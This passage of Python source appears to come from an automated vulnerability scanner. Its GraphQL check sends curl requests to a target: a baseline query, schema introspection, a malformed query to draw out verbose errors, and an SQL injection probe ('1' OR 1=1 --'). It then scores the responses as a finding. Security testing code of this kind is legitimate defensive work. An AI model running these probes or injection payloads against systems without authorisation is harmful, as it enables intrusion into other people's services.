        f'-d \'{{"query": "{{ __typename }}"}}\' "{url}" 2>/dev/null'
    )
    baseline_result = await runner.run(baseline_cmd, "vuln_graphql_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
    baseline_body = baseline_result.raw_output

    # 2. Introspection query
    introspection_query = (
        '{"query": "{ __schema { queryType { name } types { name kind } directives { name } } }"}'
    )
    intro_cmd = (
        f'curl -s -X POST -H "Content-Type: application/json" '
        f"-d '{introspection_query}' \"{url}\" 2>/dev/null"
    )
    intro_result = await runner.run(intro_cmd, "vuln_graphql_introspection", target, Phase.VULN_ANALYSIS, timeout=20)

    # 3. Error verbosity (malformed query)
    error_cmd = (
        f'curl -s -X POST -H "Content-Type: application/json" '
        f'-d \'{{"query": "{{ nonExistentField123 }}"}}\' "{url}" 2>/dev/null'
    )
    error_result = await runner.run(error_cmd, "vuln_graphql_error", target, Phase.VULN_ANALYSIS, timeout=15)

    # 4. Injection probe (single-quote to trigger SQL/parser errors)
    injection_payload = '{"query": "{ user(id: \\"1\' OR 1=1 --\\") { id name } }"}'
    injection_cmd = (
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d {injection_payload!r} \"{url}\" 2>/dev/null"
    )
    injection_result = await runner.run(injection_cmd, "vuln_graphql_injection", target, Phase.VULN_ANALYSIS, timeout=15)

    chain = validate_graphql(
        output=baseline_body,
        introspection_response=intro_result.raw_output,
        error_response=error_result.raw_output,
        injection_response=injection_result.raw_output,
        baseline_body=baseline_body,
    )

    metrics.record_run("vuln_graphql")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_graphql", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "endpoint": endpoint,
        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        "introspection_raw": intro_result.raw_output[:2000],
        "error_raw": error_result.raw_output[:1000],
    }
